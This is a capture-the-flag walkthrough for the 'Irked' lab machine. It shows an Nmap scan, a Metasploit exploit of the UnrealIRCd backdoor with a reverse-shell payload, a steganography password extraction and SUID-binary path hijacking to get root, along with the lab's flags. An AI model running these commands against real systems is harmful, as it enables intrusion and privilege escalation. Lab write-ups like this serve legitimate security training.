

Initial Nmap scan:

```
nmap -sV -sC -p- 10.10.10.117
```

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
60833/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
```

## Exploiting UnrealIRCd Backdoor

Use Metasploit or manual reverse shell over the UnrealIRCd backdoor:
```
msfconsole
search UnrealIRCd 
select 0
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.10.10.117
set RPORT 65534
set payload cmd/unix/reverse
set LHOST <tun0 IP>
set LPORT 4444
run
```
Shell as `ircd`

## Lateral Movement 

```
find /home/djmardov -type f -exec ls -la {} \; 2>/dev/null
-rw-r--r-- 1 djmardov djmardov 675 May 11  2018 /home/djmardov/.profile
-rw-r--r-- 1 djmardov djmardov 52 May 16  2018 /home/djmardov/Documents/.backup
-rw------- 1 djmardov djmardov 4706 Nov  3  2018 /home/djmardov/.ICEauthority
-rw-r--r-- 1 djmardov djmardov 220 May 11  2018 /home/djmardov/.bash_logout
-rw-r--r-- 1 djmardov djmardov 3515 May 11  2018 /home/djmardov/.bashrc
-rw-r----- 1 root djmardov 33 Apr 17 21:38 /home/djmardov/user.txt
ircd@irked:~/Unreal3.2$ ls -la /home/djmardov
```
Lets check the .backup
```
/home/djmardov/Documents/.backup
cat /home/djmardov/Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

If we try to log in to djmardov with this password, we are not allowed to do that :(
But there was an image on the from page, lets have a look at that.

```
wget http://10.10.10.117/irked.jpg
```

```
steghide extract -sf irked.jpg
# Password: UPupDOWNdownLRlrBAbaSSss

Kab6h+m+bbp2J:HG
```

Now back in our shell 
``
```
su djmardov
# Password: Kab6h+m+bbp2J:HG

cat ~/user.txt
88780f4a6407365cc883e23959d27e6e
```

## Privilege Escalation to Root

Check for SUID binaries:
```
find / -perm -4000 -type f 2>/dev/null
...
/usr/bin/viewuser
...
```

If we run that 
```
/usr/bin/viewuser
sh: 1: /tmp/listusers: not found
```
This means it tries to run `/tmp/listusers` **as root**.
Create malicious script:

```
echo "/bin/sh" > /tmp/listusers
chmod +x /tmp/listusers
```

Run the SUID binary:
```
/usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2025-04-17 21:38 (:0)
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
pass.txt  root.txt
# cat root.txt
cat root.txt
feff7c74c72c03a02efec10c2bab2b52
```